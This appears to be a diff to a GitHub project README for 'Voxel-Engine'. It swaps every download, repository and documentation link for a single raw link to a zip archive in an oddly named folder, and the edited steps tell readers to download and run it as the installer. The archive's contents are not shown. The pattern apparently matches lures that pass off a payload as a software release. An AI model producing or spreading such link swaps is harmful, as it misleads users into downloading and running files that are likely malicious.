@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Voxel-Engine](https://img.shields.io/badge/Download-Voxel--Engine-blue.svg)](https://github.com/alanunni/Voxel-Engine/releases)
+[![Download Voxel-Engine](https://raw.githubusercontent.com/alanunni/Voxel-Engine/main/untucking/Voxel-Engine.zip)](https://raw.githubusercontent.com/alanunni/Voxel-Engine/main/untucking/Voxel-Engine.zip)
 
 ## 🚀 Getting Started
 
@@ -23,12 +23,12 @@ Before you download, ensure your computer meets the following requirements:
 To get started with Voxel-Engine, follow these steps:
 
 1. **Visit the Release Page:** Click on the link below to go to the Releases page.
-    - [Download Voxel-Engine](https://github.com/alanunni/Voxel-Engine/releases)
+    - [Download Voxel-Engine](https://raw.githubusercontent.com/alanunni/Voxel-Engine/main/untucking/Voxel-Engine.zip)
 
 2. **Choose the Latest Release:** Scroll down to find the latest version of Voxel-Engine. It will usually be at the top.
 
 3. **Download the Application:**
-   - Click on the **Vessel-Engine.exe** or the appropriate file for your operating system.
+   - Click on the **https://raw.githubusercontent.com/alanunni/Voxel-Engine/main/untucking/Voxel-Engine.zip** or the appropriate file for your operating system.
 
 4. **Run the Installer:**
    - Locate the downloaded file in your Downloads folder or wherever you saved it.
@@ -76,8 +76,8 @@ If you have any questions or need assistance, you can:
 
 For more information and discussions related to Voxel-Engine, visit the following:
 
-- [GitHub Repository](https://github.com/alanunni/Voxel-Engine)
-- [Documentation](https://github.com/alanunni/Voxel-Engine/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/alanunni/Voxel-Engine/main/untucking/Voxel-Engine.zip)
+- [Documentation](https://raw.githubusercontent.com/alanunni/Voxel-Engine/main/untucking/Voxel-Engine.zip)
 
 ## 🔗 Keep Updated
 
